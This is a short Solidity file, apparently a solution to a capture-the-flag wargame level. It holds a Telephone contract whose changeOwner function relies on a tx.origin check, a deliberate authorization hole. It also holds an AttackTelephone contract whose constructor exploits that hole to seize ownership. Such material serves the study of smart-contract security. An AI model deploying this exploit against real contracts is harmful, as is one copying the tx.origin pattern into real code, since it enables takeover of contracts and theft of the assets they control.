// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AttackTelephone {
    Telephone victim;

    constructor(address _victimAddress) public {
        victim = Telephone(_victimAddress);
        victim.changeOwner(msg.sender);
    }
}
